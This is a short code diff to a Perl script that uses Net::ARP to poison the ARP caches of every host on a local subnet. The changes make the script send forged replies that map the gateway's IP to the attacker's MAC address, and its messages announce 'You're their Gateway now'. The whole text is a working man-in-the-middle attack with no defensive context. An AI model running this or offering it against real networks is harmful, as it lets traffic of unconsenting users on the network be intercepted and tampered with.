@@ -21,23 +21,20 @@ my $gateway = $device->gatewayIp;
 say "Network: $network";
 say "Gateway: $gateway";
 
-# get the mac addr of the gateway
-my $gateway_mac = Net::ARP::arp_lookup($iface, $gateway);
-say "Gateway: $gateway_mac";
-
-# tell the network (except gateway) that you're the router
-say "Spreading the new manager :/";
+# tell the network (except gateway) that you're the gateway now
+say "Spreading the new Gateway";
 for my $ip_address ($network->enumerate) {
     # skip x.x.x.0 and x.x.x.255 and the gateway
     unless ($ip_address =~ /\.0$|\.255$|$gateway/) {
+        my $mac_address = Net::ARP::arp_lookup($iface, $ip_address);
         Net::ARP::send_packet (
             $iface,
-            $device->ip,
+            $gateway,           # the gateway IP
             $ip_address,
-            $device->mac,
-            $gateway_mac,
+            $device->mac,       # is my mac addr
+            $mac_address,
             "reply",
         );
     }
 }
-say "You're in charge now :)";
+say "You're their Gateway now";
